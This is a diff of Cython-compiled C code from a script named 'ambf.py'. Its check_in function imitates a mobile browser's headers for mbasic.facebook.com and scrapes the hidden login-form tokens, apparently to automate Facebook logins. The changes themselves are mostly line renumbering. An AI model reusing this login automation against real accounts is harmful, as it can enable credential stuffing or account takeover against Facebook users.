-  if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_sec_fetch_user, __pyx_kp_s_1_2) < 0) __PYX_ERR(0, 639, __pyx_L1_error)
-  if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_sec_fetch_dest, __pyx_n_s_document) < 0) __PYX_ERR(0, 639, __pyx_L1_error)
-  __pyx_t_4 = PyNumber_Add(__pyx_v_mb, __pyx_kp_s_login_next_ref_dbl_fl_refid_8); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 639, __pyx_L1_error)
+  if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_Host, __pyx_kp_s_mbasic_facebook_com) < 0) __PYX_ERR(0, 632, __pyx_L1_error)
+  if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_cache_control, __pyx_kp_s_max_age_0) < 0) __PYX_ERR(0, 632, __pyx_L1_error)
+  if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_upgrade_insecure_requests, __pyx_kp_s_1) < 0) __PYX_ERR(0, 632, __pyx_L1_error)
+  if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_origin, __pyx_v_mb) < 0) __PYX_ERR(0, 632, __pyx_L1_error)
+  if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_content_type, __pyx_kp_s_application_x_www_form_urlencode) < 0) __PYX_ERR(0, 632, __pyx_L1_error)
+  if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_user_agent, __pyx_v_ua) < 0) __PYX_ERR(0, 632, __pyx_L1_error)
+  if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_accept, __pyx_kp_s_text_html_application_xhtml_xml_2) < 0) __PYX_ERR(0, 632, __pyx_L1_error)
+  if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_x_requested_with, __pyx_kp_s_mark_via_gp) < 0) __PYX_ERR(0, 632, __pyx_L1_error)
+  if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_sec_fetch_site, __pyx_kp_s_same_origin) < 0) __PYX_ERR(0, 632, __pyx_L1_error)
+  if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_sec_fetch_mode, __pyx_n_s_navigate) < 0) __PYX_ERR(0, 632, __pyx_L1_error)
+  if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_sec_fetch_user, __pyx_kp_s_1_2) < 0) __PYX_ERR(0, 632, __pyx_L1_error)
+  if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_sec_fetch_dest, __pyx_n_s_document) < 0) __PYX_ERR(0, 632, __pyx_L1_error)
+  __pyx_t_4 = PyNumber_Add(__pyx_v_mb, __pyx_kp_s_login_next_ref_dbl_fl_refid_8); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 632, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_4);
-  if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_referer, __pyx_t_4) < 0) __PYX_ERR(0, 639, __pyx_L1_error)
+  if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_referer, __pyx_t_4) < 0) __PYX_ERR(0, 632, __pyx_L1_error)
   __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
-  if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_accept_encoding, __pyx_kp_s_gzip_deflate) < 0) __PYX_ERR(0, 639, __pyx_L1_error)
-  if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_accept_language, __pyx_kp_s_id_ID_id_q_0_9_en_US_q_0_8_en_q) < 0) __PYX_ERR(0, 639, __pyx_L1_error)
+  if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_accept_encoding, __pyx_kp_s_gzip_deflate) < 0) __PYX_ERR(0, 632, __pyx_L1_error)
+  if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_accept_language, __pyx_kp_s_id_ID_id_q_0_9_en_US_q_0_8_en_q) < 0) __PYX_ERR(0, 632, __pyx_L1_error)
   __pyx_t_4 = NULL;
   if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
     __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_2);
@@ -19578,54 +19337,54 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
   __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_4, __pyx_t_3) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3);
   __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
   __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
-  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 639, __pyx_L1_error)
+  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 632, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_1);
   __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
   __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
-  /* "ambf.py":640
+  /* "ambf.py":633
  * 	#-> pemisah
  * 	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
  * 	data = {}             # <<<<<<<<<<<<<<
  * 	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
  * 	fm = ged.find("form",{"method":"post"})
  */
-  __pyx_t_1 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 640, __pyx_L1_error)
+  __pyx_t_1 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 633, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_1);
   __pyx_v_data = ((PyObject*)__pyx_t_1);
   __pyx_t_1 = 0;
 
-  /* "ambf.py":641
+  /* "ambf.py":634
  * 	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
  * 	data = {}
  * 	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")             # <<<<<<<<<<<<<<
  * 	fm = ged.find("form",{"method":"post"})
  * 	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
  */
-  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_parser); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 641, __pyx_L1_error)
+  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_parser); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 634, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_2);
-  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_get); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 641, __pyx_L1_error)
+  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_get); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 634, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_3);
-  __pyx_t_4 = PyNumber_Add(__pyx_v_mb, __pyx_kp_s_login_next_ref_dbl_fl_refid_8); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 641, __pyx_L1_error)
+  __pyx_t_4 = PyNumber_Add(__pyx_v_mb, __pyx_kp_s_login_next_ref_dbl_fl_refid_8); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 634, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_4);
-  __pyx_t_5 = PyTuple_New(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 641, __pyx_L1_error)
+  __pyx_t_5 = PyTuple_New(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 634, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_5);
   __Pyx_GIVEREF(__pyx_t_4);
   PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_4);
   __pyx_t_4 = 0;
-  __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 641, __pyx_L1_error)
+  __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 634, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_4);
-  __pyx_t_6 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 641, __pyx_L1_error)
+  __pyx_t_6 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 634, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_6);
-  if (PyDict_SetItem(__pyx_t_6, __pyx_kp_s_user_agent, __pyx_v_ua) < 0) __PYX_ERR(0, 641, __pyx_L1_error)
-  if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_headers, __pyx_t_6) < 0) __PYX_ERR(0, 641, __pyx_L1_error)
+  if (PyDict_SetItem(__pyx_t_6, __pyx_kp_s_user_agent, __pyx_v_ua) < 0) __PYX_ERR(0, 634, __pyx_L1_error)
+  if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_headers, __pyx_t_6) < 0) __PYX_ERR(0, 634, __pyx_L1_error)
   __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
-  __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_5, __pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 641, __pyx_L1_error)
+  __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_5, __pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 634, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_6);
   __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
   __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
   __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
-  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_text); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 641, __pyx_L1_error)
+  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_text); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 634, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_4);
   __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
   __pyx_t_6 = NULL;
@@ -19643,7 +19402,7 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
   #if CYTHON_FAST_PYCALL
   if (PyFunction_Check(__pyx_t_2)) {
     PyObject *__pyx_temp[3] = {__pyx_t_6, __pyx_t_4, __pyx_kp_s_html_parser};
-    __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 641, __pyx_L1_error)
+    __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 634, __pyx_L1_error)
     __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
@@ -19652,14 +19411,14 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
   #if CYTHON_FAST_PYCCALL
   if (__Pyx_PyFastCFunction_Check(__pyx_t_2)) {
     PyObject *__pyx_temp[3] = {__pyx_t_6, __pyx_t_4, __pyx_kp_s_html_parser};
-    __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 641, __pyx_L1_error)
+    __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 634, __pyx_L1_error)
     __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
   } else
   #endif
   {
-    __pyx_t_5 = PyTuple_New(2+__pyx_t_7); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 641, __pyx_L1_error)
+    __pyx_t_5 = PyTuple_New(2+__pyx_t_7); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 634, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_5);
     if (__pyx_t_6) {
       __Pyx_GIVEREF(__pyx_t_6); PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_6); __pyx_t_6 = NULL;
@@ -19670,7 +19429,7 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
     __Pyx_GIVEREF(__pyx_kp_s_html_parser);
     PyTuple_SET_ITEM(__pyx_t_5, 1+__pyx_t_7, __pyx_kp_s_html_parser);
     __pyx_t_4 = 0;
-    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_5, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 641, __pyx_L1_error)
+    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_5, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 634, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
   }
@@ -19678,18 +19437,18 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
   __pyx_v_ged = __pyx_t_1;
   __pyx_t_1 = 0;
 
-  /* "ambf.py":642
+  /* "ambf.py":635
  * 	data = {}
  * 	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
  * 	fm = ged.find("form",{"method":"post"})             # <<<<<<<<<<<<<<
  * 	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
  * 	for i in fm.find_all("input"):
  */
-  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_ged, __pyx_n_s_find); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 642, __pyx_L1_error)
+  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_ged, __pyx_n_s_find); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 635, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_2);
-  __pyx_t_5 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 642, __pyx_L1_error)
+  __pyx_t_5 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 635, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_5);
-  if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_method, __pyx_n_s_post) < 0) __PYX_ERR(0, 642, __pyx_L1_error)
+  if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_method, __pyx_n_s_post) < 0) __PYX_ERR(0, 635, __pyx_L1_error)
   __pyx_t_4 = NULL;
   __pyx_t_7 = 0;
   if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
@@ -19705,7 +19464,7 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
   #if CYTHON_FAST_PYCALL
   if (PyFunction_Check(__pyx_t_2)) {
     PyObject *__pyx_temp[3] = {__pyx_t_4, __pyx_n_s_form, __pyx_t_5};
-    __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 642, __pyx_L1_error)
+    __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 635, __pyx_L1_error)
     __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
@@ -19714,14 +19473,14 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
   #if CYTHON_FAST_PYCCALL
   if (__Pyx_PyFastCFunction_Check(__pyx_t_2)) {
     PyObject *__pyx_temp[3] = {__pyx_t_4, __pyx_n_s_form, __pyx_t_5};
-    __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 642, __pyx_L1_error)
+    __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 635, __pyx_L1_error)
     __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
   } else
   #endif
   {
-    __pyx_t_6 = PyTuple_New(2+__pyx_t_7); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 642, __pyx_L1_error)
+    __pyx_t_6 = PyTuple_New(2+__pyx_t_7); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 635, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_6);
     if (__pyx_t_4) {
       __Pyx_GIVEREF(__pyx_t_4); PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_t_4); __pyx_t_4 = NULL;
@@ -19732,7 +19491,7 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
     __Pyx_GIVEREF(__pyx_t_5);
     PyTuple_SET_ITEM(__pyx_t_6, 1+__pyx_t_7, __pyx_t_5);
     __pyx_t_5 = 0;
-    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_6, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 642, __pyx_L1_error)
+    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_6, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 635, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
   }
@@ -19740,14 +19499,14 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
   __pyx_v_fm = __pyx_t_1;
   __pyx_t_1 = 0;
 
-  /* "ambf.py":643
+  /* "ambf.py":636
  * 	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
  * 	fm = ged.find("form",{"method":"post"})
  * 	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]             # <<<<<<<<<<<<<<
  * 	for i in fm.find_all("input"):
  * 		if i.get("name") in list:
  */
-  __pyx_t_1 = PyList_New(8); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 643, __pyx_L1_error)
+  __pyx_t_1 = PyList_New(8); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 636, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_1);
   __Pyx_INCREF(__pyx_n_s_lsd);
   __Pyx_GIVEREF(__pyx_n_s_lsd);
@@ -19776,14 +19535,14 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
   __pyx_v_list = ((PyObject*)__pyx_t_1);
   __pyx_t_1 = 0;
 
-  /* "ambf.py":644
+  /* "ambf.py":637
  * 	fm = ged.find("form",{"method":"post"})
  * 	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
  * 	for i in fm.find_all("input"):             # <<<<<<<<<<<<<<
  * 		if i.get("name") in list:
  * 			data.update({i.get("name"):i.get("value")})
  */
-  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_fm, __pyx_n_s_find_all); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 644, __pyx_L1_error)
+  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_fm, __pyx_n_s_find_all); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 637, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_2);
   __pyx_t_6 = NULL;
   if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
@@ -19797,16 +19556,16 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
   }
   __pyx_t_1 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_6, __pyx_n_s_input) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_n_s_input);
   __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
-  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 644, __pyx_L1_error)
+  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 637, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_1);
   __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
   if (likely(PyList_CheckExact(__pyx_t_1)) || PyTuple_CheckExact(__pyx_t_1)) {
     __pyx_t_2 = __pyx_t_1; __Pyx_INCREF(__pyx_t_2); __pyx_t_8 = 0;
     __pyx_t_9 = NULL;
   } else {
-    __pyx_t_8 = -1; __pyx_t_2 = PyObject_GetIter(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 644, __pyx_L1_error)
+    __pyx_t_8 = -1; __pyx_t_2 = PyObject_GetIter(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 637, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_2);
-    __pyx_t_9 = Py_TYPE(__pyx_t_2)->tp_iternext; if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 644, __pyx_L1_error)
+    __pyx_t_9 = Py_TYPE(__pyx_t_2)->tp_iternext; if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 637, __pyx_L1_error)
   }
   __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
   for (;;) {
@@ -19814,17 +19573,17 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
       if (likely(PyList_CheckExact(__pyx_t_2))) {
         if (__pyx_t_8 >= PyList_GET_SIZE(__pyx_t_2)) break;
         #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
-        __pyx_t_1 = PyList_GET_ITEM(__pyx_t_2, __pyx_t_8); __Pyx_INCREF(__pyx_t_1); __pyx_t_8++; if (unlikely(0 < 0)) __PYX_ERR(0, 644, __pyx_L1_error)
+        __pyx_t_1 = PyList_GET_ITEM(__pyx_t_2, __pyx_t_8); __Pyx_INCREF(__pyx_t_1); __pyx_t_8++; if (unlikely(0 < 0)) __PYX_ERR(0, 637, __pyx_L1_error)
         #else
-        __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_8); __pyx_t_8++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 644, __pyx_L1_error)
+        __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_8); __pyx_t_8++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 637, __pyx_L1_error)
         __Pyx_GOTREF(__pyx_t_1);
         #endif
       } else {
         if (__pyx_t_8 >= PyTuple_GET_SIZE(__pyx_t_2)) break;
         #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
-        __pyx_t_1 = PyTuple_GET_ITEM(__pyx_t_2, __pyx_t_8); __Pyx_INCREF(__pyx_t_1); __pyx_t_8++; if (unlikely(0 < 0)) __PYX_ERR(0, 644, __pyx_L1_error)
+        __pyx_t_1 = PyTuple_GET_ITEM(__pyx_t_2, __pyx_t_8); __Pyx_INCREF(__pyx_t_1); __pyx_t_8++; if (unlikely(0 < 0)) __PYX_ERR(0, 637, __pyx_L1_error)
         #else
-        __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_8); __pyx_t_8++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 644, __pyx_L1_error)
+        __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_8); __pyx_t_8++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 637, __pyx_L1_error)
         __Pyx_GOTREF(__pyx_t_1);
         #endif
       }
@@ -19834,7 +19593,7 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
         PyObject* exc_type = PyErr_Occurred();
         if (exc_type) {
           if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
-          else __PYX_ERR(0, 644, __pyx_L1_error)
+          else __PYX_ERR(0, 637, __pyx_L1_error)
         }
         break;
       }
@@ -19843,14 +19602,14 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
     __Pyx_XDECREF_SET(__pyx_v_i, __pyx_t_1);
     __pyx_t_1 = 0;
 
-    /* "ambf.py":645
+    /* "ambf.py":638
  * 	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
  * 	for i in fm.find_all("input"):
  * 		if i.get("name") in list:             # <<<<<<<<<<<<<<
  * 			data.update({i.get("name"):i.get("value")})
  * 		else:
  */
-    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_i, __pyx_n_s_get); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 645, __pyx_L1_error)
+    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_i, __pyx_n_s_get); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 638, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_6);
     __pyx_t_5 = NULL;
     if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
@@ -19864,24 +19623,24 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
     }
     __pyx_t_1 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_5, __pyx_n_s_name) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_n_s_name);
     __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
-    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 645, __pyx_L1_error)
+    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 638, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
-    __pyx_t_10 = (__Pyx_PySequence_ContainsTF(__pyx_t_1, __pyx_v_list, Py_EQ)); if (unlikely(__pyx_t_10 < 0)) __PYX_ERR(0, 645, __pyx_L1_error)
+    __pyx_t_10 = (__Pyx_PySequence_ContainsTF(__pyx_t_1, __pyx_v_list, Py_EQ)); if (unlikely(__pyx_t_10 < 0)) __PYX_ERR(0, 638, __pyx_L1_error)
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
     __pyx_t_11 = (__pyx_t_10 != 0);
     if (__pyx_t_11) {
 
-      /* "ambf.py":646
+      /* "ambf.py":639
  * 	for i in fm.find_all("input"):
  * 		if i.get("name") in list:
  * 			data.update({i.get("name"):i.get("value")})             # <<<<<<<<<<<<<<
  * 		else:
  * 			continue
  */
-      __pyx_t_1 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 646, __pyx_L1_error)
+      __pyx_t_1 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 639, __pyx_L1_error)
       __Pyx_GOTREF(__pyx_t_1);
-      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_i, __pyx_n_s_get); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 646, __pyx_L1_error)
